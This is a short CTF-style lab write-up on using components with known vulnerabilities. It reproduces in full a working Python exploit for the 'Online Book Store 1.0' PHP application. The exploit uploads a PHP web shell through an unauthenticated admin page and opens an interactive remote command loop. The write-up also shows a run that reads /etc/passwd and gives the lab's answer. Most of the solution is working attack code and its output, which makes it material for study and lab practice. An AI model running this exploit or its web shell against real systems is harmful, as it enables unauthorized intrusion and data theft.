# Components with Known Vulnerabilities

**Date:** 03, January, 2021

**Author:** Dhilip Sanjay S

---

- Company/Entity that you're pen-testing is using a program that already has a well documented vulnerability.
- For example, a company hasn't updated their version of Wordpress for a few years - you can used tools like **wpscan** to find its version.
- You can even find better exploit for RCE on [Exploit-db](https://www.exploit-db.com/exploits/41962).

---
## Solutions

### How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
- **Answer:** 1611
- **Steps to Reproduce:** 
    - Find an exploit for the book store application.
    - Search for `book store` in exploit-db. Look for `Remote Code Execution`.
    - Execute the payload as instructed.
    - [Online Bookstore - Unauthenticated RCE](https://www.exploit-db.com/exploits/47887)
    - Exploit code:
    ```python
    # Exploit Title: Online Book Store 1.0 - Unauthenticated Remote Code Execution
    # Google Dork: N/A
    # Date: 2020-01-07
    # Exploit Author: Tib3rius
    # Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/
    # Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
    # Version: 1.0
    # Tested on: Ubuntu 16.04
    # CVE: N/A

    import argparse
    import random
    import requests
    import string
    import sys

    parser = argparse.ArgumentParser()
    parser.add_argument('url', action='store', help='The URL of the target.')
    args = parser.parse_args()

    url = args.url.rstrip('/')
    random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))

    payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

    file = {'image': (random_file + '.php', payload, 'text/php')}
    print('> Attempting to upload PHP web shell...')
    r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
    print('> Verifying shell upload...')
    r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)

    if random_file in r.text:
        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
        print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
        launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
        if launch_shell.lower() == 'y':
            while True:
                cmd = str(input('RCE $ '))
                if cmd == 'exit':
                    sys.exit(0)
                r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
                print(r.text)
    else:
        if r.status_code == 200:
            print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
        else:
            print('> Web shell failed to upload! The web server may not have write permissions.')
            
    ```
    
    - Execution of the exploit code:
    ```bash
    root@kali: python3 bookstore-rce.py http://<MACHINE_IP>
    > Attempting to upload PHP web shell...
    > Verifying shell upload...
    > Web shell uploaded to http://<MACHINE_IP>/bootstrap/img/NnwsQGewOj.php
    > Example command usage: http://<MACHINE_IP>/bootstrap/img/NnwsQGewOj.php?cmd=whoami
    > Do you wish to launch a shell here? (y/n): y

    RCE $ wc -c /etc/passwd
    1611 /etc/passwd
    ```

---